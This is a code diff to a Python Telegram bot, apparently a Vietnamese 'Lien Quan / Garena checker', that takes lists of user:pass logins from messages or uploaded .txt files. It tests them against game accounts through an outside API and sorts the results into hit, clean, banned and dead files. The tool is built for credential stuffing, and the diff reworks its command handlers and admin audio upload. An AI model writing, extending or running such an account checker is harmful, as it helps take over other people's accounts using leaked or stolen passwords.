+    for fn in [CLEAN_OUTPUT_FILE, BANNED_OUTPUT_FILE, HIT_OUTPUT_FILE,
+               DEAD_OUTPUT_FILE, ERROR_OUTPUT_FILE]:
+        c = 0
+        if os.path.exists(fn):
+            with open(fn, 'r', encoding='utf-8') as f:
+                c = sum(1 for _ in f)
+        counts[fn] = c
+    safe_send_message(message.chat.id, f"""
+📊 <b>THONG KE FILE</b>
+🟢 Clean: <code>{counts[CLEAN_OUTPUT_FILE]}</code>
+🚫 Banned: <code>{counts[BANNED_OUTPUT_FILE]}</code>
+🎯 Hits: <code>{counts[HIT_OUTPUT_FILE]}</code>
+❌ Dead: <code>{counts[DEAD_OUTPUT_FILE]}</code>
+⚠️ Error: <code>{counts[ERROR_OUTPUT_FILE]}</code>
 """)
 
-@bot.message_handler(content_types=['audio'])
-def handle_audio_upload(message):
+
+@bot.message_handler(commands=['clearbanned'])
+def cmd_clearbanned(message):
     if str(message.from_user.id) != ADMIN_CHAT_ID:
         safe_send_message(message.chat.id, "❌ Khong co quyen!")
         return
-    
-    global CUSTOM_AUDIO_DATA
-    
-    try:
-        file_info = bot.get_file(message.audio.file_id)
-        audio_data = bot.download_file(file_info.file_path)
-        
-        if not audio_data:
-            safe_send_message(message.chat.id, "❌ Khong the tai audio!")
-            return
-        
-        if len(audio_data) > 20 * 1024 * 1024:
-            safe_send_message(message.chat.id, "❌ File qua lon! Gioi han 20MB.")
-            return
-        
-        with AUDIO_LOCK:
-            CUSTOM_AUDIO_DATA = audio_data
-        
-        with open(CUSTOM_AUDIO_PATH, 'wb') as f:
-            f.write(audio_data)
-        
-        duration = message.audio.duration if message.audio.duration else 0
-        file_size_mb = len(audio_data) / (1024 * 1024)
-        
-        safe_send_message(message.chat.id, f"""
-✅ UPLOAD AUDIO THANH CONG!
-📁 Ten: {message.audio.file_name or 'audio'}
-⏱ {duration}s | 📦 {file_size_mb:.2f} MB
-""")
-        
-    except Exception as e:
-        safe_send_message(message.chat.id, f"❌ Loi: {e}")
+    clear_output_files()
+    safe_send_message(message.chat.id, "✅ Da xoa tat ca file output!")
+
+
+@bot.message_handler(commands=['upaudio'])
+def cmd_upaudio(message):
+    if str(message.from_user.id) != ADMIN_CHAT_ID:
+        safe_send_message(message.chat.id, "❌ Khong co quyen!")
+        return
+    safe_send_message(message.chat.id, "🎵 Gui file .wav hoac .mp3.")
+
 
 @bot.message_handler(commands=['delaudio'])
 def cmd_delaudio(message):
     if str(message.from_user.id) != ADMIN_CHAT_ID:
         safe_send_message(message.chat.id, "❌ Khong co quyen!")
         return
-    
     global CUSTOM_AUDIO_DATA
-    
     with AUDIO_LOCK:
         CUSTOM_AUDIO_DATA = None
-    
     try:
         if os.path.exists(CUSTOM_AUDIO_PATH):
             os.remove(CUSTOM_AUDIO_PATH)
     except:
         pass
-    
     safe_send_message(message.chat.id, "✅ Da xoa audio custom!")
 
-@bot.message_handler(commands=['start'])
-def cmd_start(message):
-    if not check_membership(message):
-        return
-    
-    safe_send_message(message.chat.id, f"""
- <b>GARENA CHECKER - API V2.1</b>
-👤 Admin: @baohuyno1
 
+@bot.message_handler(content_types=['audio'])
+def handle_audio(message):
+    if str(message.from_user.id) != ADMIN_CHAT_ID:
+        safe_send_message(message.chat.id, "❌ Khong co quyen!")
+        return
+    global CUSTOM_AUDIO_DATA
+    try:
+        fi = bot.get_file(message.audio.file_id)
+        ad = bot.download_file(fi.file_path)
+        if not ad:
+            safe_send_message(message.chat.id, "❌ Khong the tai!")
+            return
+        if len(ad) > 20 * 1024 * 1024:
+            safe_send_message(message.chat.id, "❌ File qua lon! Max 20MB.")
+            return
+        with AUDIO_LOCK:
+            CUSTOM_AUDIO_DATA = ad
+        with open(CUSTOM_AUDIO_PATH, 'wb') as f:
+            f.write(ad)
+        safe_send_message(message.chat.id,
+                          f"✅ UPLOAD AUDIO OK! {len(ad)/(1024*1024):.2f} MB")
+    except Exception as e:
+        safe_send_message(message.chat.id, f"❌ Loi: {e}")
 
-📌 <b>LENH:</b>
-/check user:pass - Check 1 acc
-/checkmulti user1:pass1,user2:pass2 - Check nhieu
-/checkall - Check tat ca
-/services - Danh sach service
-/stop - Dung check
-
-
-""")
-
-@bot.message_handler(commands=['check'])
-def cmd_check(message):
-    if not check_membership(message):
-        return
-    
-    parts = message.text.split()
-    if len(parts) < 2:
-        safe_send_message(message.chat.id, "❌ /check user:pass")
-        return
-    
-    account_str = parts[1]
-    service = parts[2] if len(parts) > 2 else "lienquan"
-    
-    if service not in SERVICE_ROUTES:
-        safe_send_message(message.chat.id, f"❌ Service: {', '.join(SERVICE_ROUTES.keys())}")
-        return
-    
-    account_input = account_str.replace('|', ':')
-    accounts, _ = loc_tk_mk_only(account_input)
-    
-    if not accounts:
-        safe_send_message(message.chat.id, "❌ Format sai! Dung: user:pass")
-        return
-    
-    user, pwd = accounts[0]
-    threading.Thread(target=check_single, args=(message.chat.id, user, pwd, service)).start()
-
-@bot.message_handler(commands=['checkmulti'])
-def cmd_checkmulti(message):
-    if not check_membership(message):
-        return
-    
-    text = message.text.strip()
-    if text.startswith('/checkmulti'):
-        text = text[len('/checkmulti'):].strip()
-    
-    if not text:
-        safe_send_message(message.chat.id, "❌ /checkmulti user1:pass1\\nuser2:pass2")
-        return
-    
-    lines = text.split('\n')
-    service = "lienquan"
-    
-    if lines:
-        last_line = lines[-1].strip()
-        last_word = last_line.split()[-1] if last_line.split() else ""
-        if last_word in SERVICE_ROUTES and len(last_line.split()) == 1:
-            service = last_word
-            lines = lines[:-1]
-        elif last_word in SERVICE_ROUTES and len(last_line.split()) > 1:
-            service = last_word
-            lines[-1] = last_line.rsplit(last_word, 1)[0].strip()
-    
-    accounts_input = '\n'.join(lines).replace(',', '\n').replace('|', ':')
-    accounts, _ = loc_tk_mk_only(accounts_input)
-    
-    if not accounts:
-        safe_send_message(message.chat.id, "❌ Khong tim thay acc!")
-        return
-    
-    safe_send_message(message.chat.id, f"📊 Check {len(accounts)} accounts...")
-    threading.Thread(target=check_batch, args=(message.chat.id, accounts, service)).start()
-
-@bot.message_handler(commands=['checkall'])
-def cmd_checkall(message):
-    if not check_membership(message):
-        return
-    
-    global pending_accounts
-    chat_id = message.chat.id
-    
-    if chat_id in pending_accounts and pending_accounts[chat_id]:
-        accounts = pending_accounts[chat_id]
-        pending_accounts[chat_id] = []
-        threading.Thread(target=check_all_services, args=(chat_id, accounts)).start()
-    else:
-        safe_send_message(chat_id, "❌ Khong co acc nao dang cho!")
-
-@bot.message_handler(commands=['services'])
-def cmd_services(message):
-    if not check_membership(message):
-        return
-    
-    msg = "📋 <b>SERVICE - API V2.1:</b>\n\n"
-    for key, value in SERVICE_ROUTES.items():
-        msg += f"{value['icon']} <b>{key}</b>: {value['desc']}\n"
-    
-    safe_send_message(message.chat.id, msg)
-
-@bot.message_handler(commands=['stop'])
-def cmd_stop(message):
-    if not check_membership(message):
-        return
-    
-    stop_event.set()
-    global checking
-    checking = False
-    safe_send_message(message.chat.id, "🛑 Da dung check!")
 
 @bot.message_handler(content_types=['text'])
 def handle_text(message):
     if not check_membership(message):
         return
-    
     global pending_accounts
-    
     text = message.text.strip()
-    chat_id = message.chat.id
-    
+    cid = message.chat.id
     if text.startswith('/'):
         return
-    
     accounts, _ = loc_tk_mk_only(text.replace('|', ':'))
-    
     if not accounts:
         return
-    
-    if chat_id not in pending_accounts:
-        pending_accounts[chat_id] = []
-    pending_accounts[chat_id] = accounts
+    pending_accounts[cid] = accounts
     save_loc_file(accounts)
-    
     preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:10]])
-    total = len(accounts)
-    
-    safe_send_message(chat_id, f"""
-📊 LOC {total} ACCOUNTS
+    safe_send_message(cid, f"""
+📊 LOC {len(accounts)} ACCOUNTS
 Preview:
 {preview}
-👇 /checkall - Check tat ca
-⚠️ KHONG LUU ACCOUNT!
+
+👇 /checkall - Check tat ca (tu dong loai bo ban)
 """)
+
 
 @bot.message_handler(content_types=['document'])
 def handle_document(message):
     if not check_membership(message):
         return
-    
-    global pending_accounts
-    chat_id = message.chat.id
-    
+    global pending_accounts, CUSTOM_AUDIO_DATA
+    cid = message.chat.id
     try:
-        file_name = message.document.file_name or ""
-        
-        if str(message.from_user.id) == ADMIN_CHAT_ID and (file_name.endswith('.wav') or file_name.endswith('.mp3')):
-            global CUSTOM_AUDIO_DATA
-            file_info = bot.get_file(message.document.file_id)
-            audio_data = bot.download_file(file_info.file_path)
-            
-            if not audio_data:
-                safe_send_message(chat_id, "❌ Khong the tai audio!")
+        fn = message.document.file_name or ""
+        if str(message.from_user.id) == ADMIN_CHAT_ID and \
+                (fn.endswith('.wav') or fn.endswith('.mp3')):
+            fi = bot.get_file(message.document.file_id)
+            ad = bot.download_file(fi.file_path)
+            if not ad:
+                safe_send_message(cid, "❌ Khong the tai audio!")
                 return
-            
-            if len(audio_data) > 20 * 1024 * 1024:
-                safe_send_message(chat_id, "❌ File qua lon! Gioi han 20MB.")
+            if len(ad) > 20 * 1024 * 1024:
+                safe_send_message(cid, "❌ File qua lon! Max 20MB.")
                 return
-            
             with AUDIO_LOCK:
-                CUSTOM_AUDIO_DATA = audio_data
-            
+                CUSTOM_AUDIO_DATA = ad
             with open(CUSTOM_AUDIO_PATH, 'wb') as f:
-                f.write(audio_data)
-            
-            file_size_mb = len(audio_data) / (1024 * 1024)
-            safe_send_message(chat_id, f"✅ UPLOAD AUDIO THANH CONG! 📦 {file_size_mb:.2f} MB")
+                f.write(ad)
+            safe_send_message(cid,
+                              f"✅ UPLOAD AUDIO OK! {len(ad)/(1024*1024):.2f} MB")
             return
-        
-        if not file_name.endswith('.txt'):
-            safe_send_message(chat_id, "❌ Chi ho tro file .txt!")
+        if not fn.endswith('.txt'):
+            safe_send_message(cid, "❌ Chi ho tro .txt!")
             return
-        
-        file_info = bot.get_file(message.document.file_id)
-        content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
-        
+        fi = bot.get_file(message.document.file_id)
+        content = bot.download_file(fi.file_path).decode('utf-8', errors='ignore')
         accounts, _ = loc_tk_mk_only(content.replace('|', ':'))
-        
         if not accounts:
-            safe_send_message(chat_id, "❌ Khong tim thay user:pass!")
+            safe_send_message(cid, "❌ Khong tim thay user:pass!")
             return
-        
-        if chat_id not in pending_accounts:
-            pending_accounts[chat_id] = []
-        pending_accounts[chat_id] = accounts
+        pending_accounts[cid] = accounts
         save_loc_file(accounts)
-        
         preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:20]])
-        total = len(accounts)
-        
-        safe_send_message(chat_id, f"""
-✅ LOC {total} ACCOUNTS
+        safe_send_message(cid, f"""
+✅ LOC {len(accounts)} ACCOUNTS
 Preview:
 {preview}
-👇 /checkall - Check tat ca
-⚠️ KHONG LUU ACCOUNT!
+
+👇 /checkall - Check tat ca (tu dong loai bo ban)
 """)
-        
     except Exception as e:
-        safe_send_message(chat_id, f"❌ Loi: {e}")
+        safe_send_message(cid, f"❌ Loi: {e}")
+
 
 def main():
     print("=" * 60)
-    print("    GARENA CHECKER BOT V6.1 - API VERSION 2.1")
+    print("    LIEN QUAN CHECKER V9.0 - AUTO REMOVE BANNED")
     print("    ADMIN: @baohuyno1")
-    print("    TIKTOK: @baohuy1109")
     print("    API: purchase.nhatminh301.com")
-    print("    ===== HIEU UNG 3D + HACKER DEP ===== ")
-    print("    ===== AM THANH TU DONG PHAT ===== ")
-    print("    ===== KHONG LUU ACCOUNT ===== ")
-    print("    ===== API VERSION 2.1 ===== ")
     print("=" * 60)
-    
     while True:
         try:
             bot.polling(none_stop=True, interval=1, timeout=30)
         except Exception as e:
             print(f"[!] Loi: {e}")
             time.sleep(5)
+
 
 if __name__ == "__main__":
     try:
